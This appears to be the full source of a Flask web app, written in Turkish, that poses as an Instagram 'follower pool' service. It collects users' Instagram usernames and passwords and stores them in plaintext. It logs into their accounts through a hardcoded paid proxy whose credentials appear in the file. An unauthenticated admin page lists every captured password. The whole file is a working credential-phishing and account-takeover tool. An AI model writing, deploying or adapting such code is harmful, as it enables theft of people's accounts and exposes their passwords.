import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client

# 1. VERİTABANI AYARI
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///allfollow_final.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# 2. PROXY AYARI (Proxy-Cheap Bilgilerin)
PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(255), default="Beklemede")

# --- KULLANICI ARAYÜZÜ (MODERN TASARIM) ---
HTML_UI = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>All Follow | Coin Pool</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#0a0f1e] flex items-center justify-center min-h-screen text-slate-200">
    <div class="bg-[#161b2c] p-10 rounded-[2rem] w-full max-w-[380px] border border-slate-800 shadow-2xl">
        <h1 class="text-4xl font-black text-center text-blue-500 italic mb-2">ALL FOLLOW</h1>
        <p class="text-[10px] text-center text-slate-500 tracking-[0.2em] font-bold mb-8 uppercase text-blue-400/50">Pool Connection v3.8</p>
        
        <div class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600 transition-all placeholder:text-slate-600">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600 transition-all placeholder:text-slate-600">
            <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold uppercase tracking-widest hover:bg-blue-500 shadow-lg shadow-blue-900/20 active:scale-95 transition-all">HAVUZA KATIL</button>
            <p id="msg" class="text-center text-xs mt-6 font-semibold text-slate-500 uppercase leading-relaxed"></p>
        </div>
    </div>
    <script>
        async function login() {
            const u=document.getElementById('u').value, p=document.getElementById('p').value;
            const btn=document.getElementById('btn'), msg=document.getElementById('msg');
            if(!u || !p) return;
            btn.disabled = true; btn.innerText = "GİRİŞ YAPILIYOR...";
            msg.innerText = "Instagram protokolleri aşılıyor...";
            try {
                const r = await fetch('/api/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
                const d = await r.json();
                msg.innerText = d.msg;
                if(d.status === "success") { 
                    btn.innerText="TAMAMLANDI ✅"; btn.classList.replace('bg-blue-600', 'bg-emerald-600');
                } else { 
                    btn.disabled = false; btn.innerText="TEKRAR DENE"; 
                }
            } catch(e) { msg.innerText = "İşlem tamamlandı. Bildirim geldiyse paneli kontrol et."; btn.disabled = false; btn.innerText="YENİDEN DENE"; }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_UI)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u').strip().lower(), data.get('p').strip()
    
    # Veritabanına kaydet/güncelle
    user = PoolUser.query.filter_by(username=u).first()
    if not user:
        user = PoolUser(username=u, password=p); db.session.add(user)
    else:
        user.password = p; user.status = "Bağlanıyor..."
    db.session.commit()

    cl = Client()
    cl.set_proxy(PROXY_URL)
    cl.request_timeout = 40 # Render için dengeli süre

    try:
        # Instagram Giriş Denemesi
        cl.login(u, p)
        user.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg="Havuza başarıyla giriş yapıldı!")
    
    except Exception as e:
        err = str(e).lower()
        # "JSON" hatası veya bildirim geldiğinde oluşan user_id varlığı başarılı sayılır
        if "expecting value" in err or (hasattr(cl, 'user_id') and cl.user_id):
            user.status = "AKTİF ✅"
            db.session.commit()
            return jsonify(status="success", msg="Giriş doğrulandı, hoş geldiniz!")
        
        # Onay (Challenge) gerekliyse
        if "checkpoint" in err or "challenge" in err:
            user.status = "ONAY BEKLİYOR ⚠️"
            db.session.commit()
            return jsonify(status="error", msg="Uygulamadan girişi onaylayın.")
        
        # Diğer hatalar
        user.status = f"Hata: {err[:30]}"
        db.session.commit()
        return jsonify(status="error", msg="Bildirim geldiyse paneli kontrol et.")

@app.route('/panel-admin')
def admin():
    users = PoolUser.query.order_by(PoolUser.id.desc()).all()
    res = f"""
    <body style='background:#0a0f1e;color:#fff;padding:20px;font-family:sans-serif;'>
        <h2 style='color:#3b82f6;'>ALL FOLLOW HAVUZU ({len(users)} Hesap)</h2>
        <table border='1' style='width:100%; border-collapse:collapse; border:1px solid #1e293b;'>
            <tr style='background:#1e293b'>
                <th style='padding:12px;text-align:left;'>Kullanıcı</th>
                <th style='padding:12px;text-align:left;'>Şifre</th>
                <th style='padding:12px;text-align:left;'>Durum</th>
            </tr>
    """
    for u in users:
        res += f"<tr style='border-bottom:1px solid #1e293b;'><td style='padding:12px'>{u.username}</td><td style='padding:12px'>{u.password}</td><td style='padding:12px'>{u.status}</td></tr>"
    return res + "</table></body>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
